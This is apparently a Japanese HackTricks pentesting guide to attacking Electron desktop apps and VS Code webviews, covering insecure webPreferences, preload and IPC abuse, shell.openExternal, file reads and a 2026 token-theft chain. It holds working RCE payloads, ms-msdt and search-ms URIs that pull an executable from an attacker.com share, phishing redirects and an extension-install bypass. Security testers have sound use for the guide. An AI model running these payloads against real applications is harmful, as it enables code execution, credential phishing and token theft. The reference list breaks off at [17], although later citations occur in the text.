# Electronデスクトップアプリ

{{#include ../../banners/hacktricks-training.md}}

## はじめに

Electronは、特権を持つ**Node.js**のメインプロセスと**Chromium**のレンダラープロセスを組み合わせています。ElectronはWebブラウザーではありません。アプリケーションコードは、ファイルシステムやシェルへのアクセスなどの機能を意図的に公開できるため、信頼できないコンテンツを読み込む場合は、通常のWebサイトよりも厳格な境界設計が必要です。<sup>[[21]](#references)</sup>

Electronアプリケーションのコードは、一般的に`.asar`アーカイブにパッケージ化されています。ソースを確認する前に展開してください:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

アプリケーションの `package.json` には、メインのエントリーポイントが記載されています。このファイルでは通常、レンダラーウィンドウを作成し、セキュリティ上重要な `webPreferences` を設定します。

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electronには、主に2種類のプロセスがあります。

- Main Process（NodeJSに完全にアクセスできる）
- Renderer Process（セキュリティ上の理由から、NodeJSへのアクセスが制限されるべき）

![Electron Desktop Apps - Introduction: Renderer Process（セキュリティ上の理由から、NodeJSへのアクセスが制限されるべき）](<../../images/image (182).png>)

**renderer process**は、ファイルを読み込むブラウザーウィンドウです:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**メインプロセス**は、通常 `BrowserWindow` の構築時に各レンダラープロセスを設定します。セキュアな設定にすると、レンダラーが侵害された場合にネイティブコード実行へつながる可能性を低減できますが、信頼できないコンテンツ自体が安全になるわけではありません。<sup>[[21]](#references)[[22]](#references)</sup>

少なくとも、次のレンダラー設定を確認してください。<sup>[[22]](#references)</sup>

- **`nodeIntegration`** はデフォルトで `false` です。有効にすると、レンダラーの JavaScript から Node.js API にアクセスできるようになり、そのレンダラーの sandbox も無効になります。
- **`contextIsolation`** はデフォルトで `true` です。ページの JavaScript コンテキストを、preload スクリプトおよび Electron 内部で使用されるコンテキストから分離します。
- **`preload`** のデフォルトパスはありません。設定された preload スクリプトはページスクリプトより先に実行され、`contextBridge` を介して範囲を限定した API を公開できます。
- **`sandbox`** は Electron 20 以降、デフォルトで `true` です。レンダラーによるオペレーティングシステムリソースへのアクセスを制限します。`nodeIntegration: true` にすると無効になります。
- **`nodeIntegrationInWorker`** はデフォルトで `false` で、Web Workers 内の Node.js 統合を制御します。
- **`nodeIntegrationInSubFrames`** はデフォルトで `false` です。
  - **`nodeIntegration`** が**有効**な場合、Electron アプリケーション内の **iframe に読み込まれた**ウェブページで **Node.js API** を使用できるようになります。
  - **`nodeIntegration`** が**無効**な場合、preload は iframe 内で読み込まれます。

設定例:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

[こちら](https://7as.es/electron/nodeIntegration_rce.txt)にあるいくつかの**RCE payloads**:<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### トラフィックをキャプチャする

start-main の設定を変更し、次のような proxy の使用を追加します:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## REAによる静的なASAR-to-native境界トレース

**REA**は、JavaScriptのブートストラップを実行せずに、ASARまたは展開済みのアプリケーションディレクトリを読み取れます。アプリケーショングラフには、パッケージのエントリーポイント、バンドルされたモジュール、`BrowserWindow`とpreloadの設定、`contextBridge`のメンバー、IPCの登録、ネイティブアドオンの要求、ソースマップの識別情報が記録されます。これにより、rendererに公開された機能から、特権を持つmainプロセスのハンドラーまでを追跡するための出発点が得られます。<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

リテラルな feature string には、完全な Evidence レコードを `application` として渡し、seed を対象で観測されたものに置き換えます。<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

同じ `trace_application_feature` workflow は、観測されたリテラルの API member、IPC channel、または module を seed として受け取ることもできます。返された source location に照らして、結果の handler path、validation candidates、native handoff を確認してください。renderer の `invoke` と対応するのは、同一の完全一致するリテラル channel 上にある一意の `ipcMain.handle`/`handleOnce` candidate のみです。同様に、`send` には一意の `ipcMain.on`/`once`/`addListener` candidate が必要です。動的または重複する handler は未解決のままです。要求された `.node` member は、検証済みの native export ではありません。その結論を導くには、Hopper/Ghidra Evidence の artifact digest が一致している必要があります。静的な到達可能性も、その path が実行されたことの証明にはなりません。<sup>[[24]](#references)[[25]](#references)</sup>

renderer と main の trust boundary および handler validation については、[Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md) を参照してください。

provider-bound native follow-up については、[Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea) を参照してください。

## Electron auto-update attack surface

release-feed integrity、rollback、signed-channel confusion、staging-file TOCTOU については、[Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md) を参照してください。

## Electron Local Code Injection

インストール済みアプリへのローカル書き込みまたは instrumentation access がある場合は、ASAR/main-process と V8 snapshot の path、および OS 固有のリンクについて、[Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) を参照してください。

## RCE: XSS + nodeIntegration

**nodeIntegration** が **on** に設定されている場合、Web ページの JavaScript は `require()` を呼び出すだけで Node.js の機能を簡単に使えます。たとえば、Windows で calc アプリケーションを実行する方法は次のとおりです。

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

この設定で指定されたスクリプトは、renderer 内の他のスクリプトよりも前に**読み込まれる**ため、**Node API に無制限にアクセスできます**：

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

したがって、このスクリプトは node-features をページにエクスポートできます:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **`contextIsolation` が有効な場合、これは機能しません**

## RCE: XSS + contextIsolation

_**contextIsolation**_ は、**Web ページのスクリプトと Electron 内部コードの JavaScript のコンテキストを分離**するため、各コードの JavaScript 実行が互いに影響しません。RCE の可能性をなくすために必要な機能です。

コンテキストが分離されていない場合、攻撃者は次のことができます。

1. **renderer で任意の JavaScript を実行する**（XSS または外部サイトへの遷移）
2. preload または Electron 内部コードで使用される**組み込みメソッドを上書きし、自分の関数にする**
3. **上書きされた関数の使用をトリガーする**
4. RCE？

組み込みメソッドを上書きできる場所は、preload コードまたは Electron 内部コードの 2 つです。


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### クリックイベントをバイパスする

リンクをクリックしたときに制限が適用される場合、通常の左クリックではなく**中央クリックする**ことで回避できる可能性があります。

```javascript
window.addEventListener('click', (e) => {
```

## shell.openExternal 経由の RCE

この例の詳細については、[https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) と [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup> を参照してください。

Electron デスクトップアプリケーションをデプロイする際は、`nodeIntegration` と `contextIsolation` の設定が正しいことを確認することが重要です。これらの設定を適用すると、メインプロセスから preload scripts または Electron のネイティブコードを標的とする **client-side remote code execution (RCE)** は、事実上防止されることが確認されています。

ユーザーがリンクを操作したり、新しいウィンドウを開いたりすると、特定のイベントリスナーがトリガーされます。これらはアプリケーションのセキュリティと機能に不可欠です：

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

これらのリスナーは、独自の**ビジネスロジック**を実装するために、**デスクトップアプリケーションによってオーバーライド**されます。アプリケーションは、遷移先のリンクを内部で開くか、外部のWebブラウザーで開くかを判断します。この判断は通常、`openInternally`関数を通じて行われます。この関数が`false`を返す場合、そのリンクは` shell.openExternal`関数を使用して外部で開く必要があることを示します。

**簡略化した擬似コード:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JSのセキュリティのベストプラクティスでは、`openExternal`関数で信頼できないコンテンツを受け入れないよう推奨しています。さまざまなプロトコルを介してRCEにつながる可能性があるためです。OSは、RCEを引き起こす可能性のあるさまざまなプロトコルに対応しています。このトピックの詳しい例と解説については、[こちらの資料](https://positive.security/blog/url-open-rce#windows-10-19042)を参照してください。脆弱性を悪用できるWindowsのプロトコルの例が記載されています。<sup>[[10]](#references)</sup>

macOSでは、`shell.openExternal('file:///System/Applications/Calculator.app')`のように、`openExternal`関数を悪用して任意のコマンドを実行できます。

**Windowsのプロトコルを悪用する例:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

この脆弱性は**[このレポート](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**で確認できます。<sup>[[11]](#references)</sup>

**webviewTag**は、**renderer process**で**NodeJS**を使用できる**非推奨の機能**です。preload context内で次のようにスクリプトを読み込めるため、無効にする必要があります。

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

そのため、任意のページを読み込める攻撃者は、このタグを使って**任意の preload script を読み込む**ことができます。

この preload script は、RCE を実現するために、**脆弱な IPC サービス（`skype-new-window`）**を呼び出す目的で悪用されました。このサービスは**`shell.openExternal`**を呼び出していました。

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## 内部ファイルの読み取り: XSS + contextIsolation

**`contextIsolation`を無効にすると、`<webview>`タグを使用できるようになり**、`<iframe>`と同様に、ローカルファイルの読み取りやexfiltrationが可能になります。脆弱性をexploitして内部ファイルの内容を読み取る方法の例が示されています:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - 内部ファイルの読み取り: XSS + contextIsolation: contextIsolationを無効にすると、タグを使用できるようになり、 と同様に、...のため](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

さらに、**内部ファイルを読み取る**別の方法も紹介されており、Electronデスクトップアプリにおける重大なローカルファイル読み取りの脆弱性が取り上げられています。これは、スクリプトをinjectしてアプリケーションをexploitし、データをexfiltrateするものです。

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + 古い Chromium**

アプリケーションにバンドルされている **Chromium** のバージョンが古く、既知の脆弱性がある場合、それを悪用して XSS を RCE に発展させられる可能性があります。<sup>[[20]](#references)</sup>\
以下の **writeup** で例を確認できます: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **内部 URL の regex バイパスによる XSS フィッシング**

XSS を発見したものの、**RCE の実行や内部ファイルの窃取ができない**場合でも、**フィッシングによる認証情報の窃取**を試みることができます。<sup>[[1]](#references)</sup>

まず、フロントエンドのコードを調べ、新しい URL が開かれたときに何が起こるかを確認します:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

**`openInternally`** の呼び出しによって、プラットフォームのリンクを**デスクトップウィンドウ**で開くか、サードパーティのリソースをシステムブラウザーで開くかが決まります。

関数の URL allowlist regex をバイパスできる場合（たとえば、ホスト名のドットがエスケープされていない場合）、攻撃者は XSS を悪用して、攻撃者が管理するインフラ上に本物そっくりの認証情報入力プロンプトを表示させることができます。

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` プロトコル

[Electron のセキュリティガイド](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols)で述べられているように、**`file://`** で実行されるページは幅広いファイルアクセス権を持ちます。そのため、**XSS によってユーザーのマシン上の任意のファイルを読み込める可能性があります**。適切に設計された **カスタムプロトコル** を使えば、アクセスを特定のファイルに制限できます。<sup>[[21]](#references)</sup>

## Remote module

Electron の Remote module を使うと、**renderer process から main process の API にアクセス**でき、Electron アプリケーション内の通信が容易になります。しかし、この module を有効にすると、重大なセキュリティリスクが生じます。アプリケーションの攻撃対象領域が広がり、cross-site scripting (XSS) 攻撃などの脆弱性の影響を受けやすくなります。

> [!TIP]
> **remote** module は main process の一部の API を renderer process に公開しますが、コンポーネントを悪用するだけで RCE を実現するのは簡単ではありません。ただし、コンポーネントから機密情報が漏れる可能性があります。

> [!WARNING]
> remote module を今も使用しているアプリの多くは、renderer process で **NodeIntegration を有効にする必要がある**方法で使用しており、これは**非常に大きなセキュリティリスク**です。

Electron 組み込みの `remote` module は非推奨になった後、削除されました。引き続きそのモデルが必要なアプリケーションでは、別の `@electron/remote` package を使用できます。セキュリティとパフォーマンスへの影響があるため、信頼できない renderer process に remote 型の機能を公開するのは避けてください。

`@electron/remote` を使用するには、まず **main process で初期化する必要があります**。

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

レンダラープロセスはその後、モジュールからオブジェクトをインポートできます:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

**[ブログ記事](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)**では、remote module のオブジェクト **`app`** が公開する興味深い**関数**がいくつか紹介されています:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - 現在のインスタンスを**終了**して新しいインスタンスを**起動**し、アプリケーションを**再起動**します。**アプリの更新**や大幅な**状態変更**に役立ちます。
- **`app.setAppLogsPath([path])`**  
   - **アプリのログ**を保存するディレクトリを**設定**または**作成**します。ログは **`app.getPath()`** または **`app.setPath(pathName, newPath)`** を使って**取得**または**変更**できます。
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - 現在の実行ファイルを、指定した**プロトコル**の**デフォルトハンドラー**として**登録**します。必要に応じて、**カスタムパス**や**引数**を指定できます。
- **`app.setUserTasks(tasks)`**  
   - （Windows の）**Jump List** の **Tasks カテゴリ**にタスクを**追加**します。各タスクでは、アプリの**起動方法**や渡す**引数**を設定できます。
- **`app.importCertificate(options, callback)`**  
   - **PKCS#12 証明書**をシステムの**証明書ストア**に**インポート**します（Linux のみ）。結果の処理には **callback** を使用できます。
- **`app.moveToApplicationsFolder([options])`**  
   - アプリケーションを（macOS の）**Applications フォルダ**に**移動**します。Mac ユーザー向けの**標準的なインストール**を実現するのに役立ちます。
- **`app.setJumpList(categories)`**  
   - Windows の**カスタム Jump List**を**設定**または**削除**します。タスクの表示方法を整理するために、**カテゴリ**を指定できます。
- **`app.setLoginItemSettings(settings)`**  
   - **ログイン時**に起動する**実行ファイル**とその**オプション**を設定します（macOS と Windows のみ）。
  
例：

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences module

Electronでシステム環境設定にアクセスし、**システムイベントを発行するための主要なAPI**です。**subscribeNotification**、**subscribeWorkspaceNotification**、**getUserDefault**、**setUserDefault**などのメソッドは、すべてこのモジュールの**一部です**。

**使用例:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **NSDistributedNotificationCenter** を使用して **ネイティブ macOS 通知**を**リッスン**します。  
* **macOS Catalina** より前は、CFNotificationCenterAddObserver に **nil** を渡すことで、**すべて**の distributed notification をスニッフィングできました。  
* **Catalina / Big Sur** 以降も、sandboxed app は通知を**名前で**登録することで、**多くのイベント**（例: **画面のロック/解除**、**ボリュームのマウント**、**ネットワークアクティビティ**など）を**サブスクライブ**できます。

### **getUserDefault / setUserDefault**

* macOS で**アプリケーション**または**グローバル**の設定を保存する **NSUserDefaults** と**やり取り**します。
    
* **getUserDefault** は、**最近使用したファイルの場所**や**ユーザーの地理的位置**などの機密情報を**取得**できます。
    
* **setUserDefault** は、これらの設定を**変更**し、アプリの**構成**に影響を与える可能性があります。
    
* **古い Electron バージョン**（v8.3.0 より前）では、NSUserDefaults の**標準 suite** のみが**アクセス可能**でした。

## Shell.showItemInFolder

この関数は、指定されたファイルをファイルマネージャーで表示します。影響を受けるプラットフォームとバージョンでは、この操作によって**ファイルが自動的に実行される可能性がありました**。

詳細については、[https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup> を確認してください。

## Content Security Policy

Electron app では、**XSS 攻撃を防ぐ**ために **Content Security Policy (CSP)** を設定する必要があります。**CSP** は、ブラウザーで**信頼されていないコード**が**実行されるのを防ぐ**ための**セキュリティ標準**です。

通常、**`main.js`** ファイルまたは **`index.html`** テンプレート内の **meta tag** で CSP を**設定**します。

詳細については、以下を確認してください:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

この実際の攻撃チェーンは Visual Studio Code 1.63 (CVE-2021-43908) に影響し、webview 内の markdown による単一の XSS が、CSP、postMessage、scheme handler の設定ミスによってどのように完全な RCE にエスカレートするかを示しています。公開 PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

攻撃チェーンの概要
- webview CSP による最初の XSS: 生成された CSP に `style-src 'self' 'unsafe-inline'` が含まれていたため、`vscode-webview://` コンテキストで inline/style ベースのインジェクションが可能でした。ペイロードは `/stealID` に beacon を送り、対象 webview の extensionId を外部へ流出させました。
- 対象 webview URL の構築: leak した ID を使って `vscode-webview://<extensionId>/.../<publicUrl>` を構築します。
- postMessage の信頼による2回目の XSS: 外側の webview は厳格な origin/type チェックなしに `window.postMessage` を信頼し、`allowScripts: true` で攻撃者の HTML を読み込みました。
- scheme/path の書き換えによるローカルファイルの読み込み: ペイロードは `file:///...` を `vscode-file://vscode-app/...` に書き換え、`exploit.md` を `RCE.html` に差し替えることで、脆弱な path validation を悪用して特権を持つローカルリソースを読み込みました。
- Node が有効なコンテキストでの RCE: 読み込まれた HTML は Node API を利用できる状態で実行され、OS コマンドを実行しました。

最終コンテキストでの RCE の例
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

postMessage の信頼性に関する関連資料:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: 合成 webview ショートカット + 宣言型 extension コマンドブリッジ

2026年6月、VS Code の webview で別種の脱出手法が明らかになりました。notebook/preview webview 内の**信頼できない JavaScript が、特権的なグローバルショートカットを合成できました**。webview の preload が `keydown` のデータをホストの workbench に転送し、ホストがそれを実際のユーザー入力として処理していたためです。<sup>[[14]](#references)</sup>

これは、プロジェクトが制御するコンテンツが特権的なエディター機能に到達する、IDE の信頼境界攻撃のより広範な歴史の一部です。<sup>[[19]](#references)</sup>

### 境界の破綻

クロスオリジンまたは sandbox 化された webview が、攻撃者の制御するキーボードフィールド（`key`、`code`、`keyCode`、修飾キー、`repeat`）を、**`event.isTrusted` を確認せずに**特権的な `postMessage`/message-port ブリッジへコピーすると、webview 内の JavaScript は次の方法で workbench のショートカットを実行できます。<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

これは、browser によって**合成入力がブロックされる**場合に特に有効です。スクリプトによるキーイベントでは通常、HTML の `<input>` 要素に任意のテキストを**入力できません**が、`keydown` を直接処理するショートカットは依然として発火します。

### 実用的な悪用パターン

- **ショートカットを利用した UI の悪用:** コマンドを入力しようとするのではなく、通知の承認、パレットの操作、フォーカス中のボタンの実行、メニューの移動などを行うグローバルバインディングを狙います。
- **workspace メタデータを利用した予測可能な特権プロンプト:** リポジトリで管理される `.vscode/extensions.json` に攻撃者の拡張機能を推奨する設定を追加すると、予測可能なインストール通知を表示させ、`Ctrl+Shift+A` などのショートカットで承認できます。
- **コマンドブリッジとしての宣言型拡張機能 manifest:** web VS Code では CSP によってローカル workspace の拡張機能コードがブロックされても、宣言型の `package.json` の contributions は読み込まれる場合があります。`.vscode/extensions` 内のローカル拡張機能で、`runCommands` を呼び出し、続けて `workbench.extensions.installExtension` などの特権的な内部コマンドを呼び出す keybinding を登録できます。<sup>[[14]](#references)[[18]](#references)</sup>

manifest の例:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **信頼されていないメタデータから到達できる隠れたセキュリティフラグ:** 内部コマンドが `{"context":{"skipPublisherTrust":true}}` のような攻撃者制御の引数を受け入れる場合、宣言型メタデータによって信頼ダイアログを抑止し、Marketplace/CDNでホストされた拡張機能をインストールできます。その拡張機能は最終的に攻撃者のコードを実行します。
- **信頼済みワークスペースの悪用:** リモート/Webワークスペースが自動的に信頼される場合、ローカルワークスペースの拡張機能は、リポジトリのコンテンツから特権を持つエディター操作へ至る高価値な橋渡しになります。
- **侵害後の影響範囲拡大:** 拡張機能の実行後、エディターが拡張機能に公開しているトークンを調査してください。`github.dev` では、窃取されたGitHubトークンが開いているリポジトリ以外でも有効だったため、`https://api.github.com/user/repos` に問い合わせることで、アクセス可能な追加のプライベートリポジトリを列挙できました。

### 監査メモ

- **webviewからホストへの入力転送**を権限境界として扱ってください。信頼されていないフレームからの合成キー/クリックイベントをホストへ再ディスパッチしてはいけません。
- 機密性の高いコマンド内で認可を強制してください。`skipPublisherTrust` のような内部フラグを設定できる、呼び出し元が提供したコマンドコンテキストを受け入れてはいけません。
- 実行可能なローカル拡張機能のコードをブロックすれば十分だと考えてはいけません。ワークスペースが制御するマニフェスト内の宣言型の定義（`keybindings`、`menus`、`commands`、タスク）も確認してください。
- 2026年6月3日の修正では、転送イベントへの `isTrusted` の追加、ノートブックwebviewでの信頼されていないキー転送の無効化、呼び出し元が指定したインストールコマンドのコンテキストの受け入れ停止が行われました。<sup>[[16]](#references)[[17]](#references)</sup>

## **ツール**

厳選された**awesome-electronjs-hacking**コレクションには、追加の調査資料、ツール、脆弱なアプリケーションのリソースが含まれています。<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity)は、Electronベースのアプリケーションにおける設定ミスやセキュリティ上のアンチパターンを特定するツールです。
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint)は、Electronegativityを使用するElectronアプリケーション向けのオープンソースVS Codeプラグインです。
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan)は、脆弱なサードパーティライブラリをチェックします。
- [**Electro.ng**](https://electro.ng/)は、商用のElectronセキュリティ分析ツールです。

## ラボ

[https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)で、脆弱なElectronアプリを悪用するラボを確認できます。<sup>[[4]](#references)</sup>

次のコマンドを使ってラボを進められます。

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

既存のブックマーク向けに以前公開されていたアドレス: [Electronデスクトップアプリ](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)。ページ全体へのルートはここにリダイレクトされます。過去のフラグメントは維持されていません。

## References

- [1] [ElectronアプリケーションにおけるPhishingと認証情報の収集](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Facebook Messenger Desktop Appの任意ファイル読み取り](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: context isolationの欠如を悪用する - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [XSSとRCEを使った最新デスクトップアプリのハッキング Workshop](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - Electron.jsのセキュリティに関するリソースの厳選リスト](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Electron APIsの誤用: 攻撃者が最初に選ぶ手段](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE payloads](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [Electronアプリケーションにおける1クリックRCE](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Electronのshell.openExternal()の危険性 - リモートコード実行に至るさまざまな経路](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [任意のURLを許可すれば、任意のコード実行を招く](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [旧式のElectron機能を使い、有名な日本のチャットツールでRCEを達成](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - リモートコード実行](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Restricted Modeにおけるリモートコード実行 (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [VS Code Webviewのキーボードイベント注入によるワンクリックGitHub Token窃取](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code issue #319593: Webviewからメインのworkbenchで任意のキーボードショートカットを実行できる](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: notebookのオープンを確認し、呼び出し元が指定したinstallExtension contextの受け入れを停止](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: notebook webviewでのプログラムによるwebview keypress/clickの再ディスパッチをブロック](https://github.com/microsoft/vscode/pull/319813)
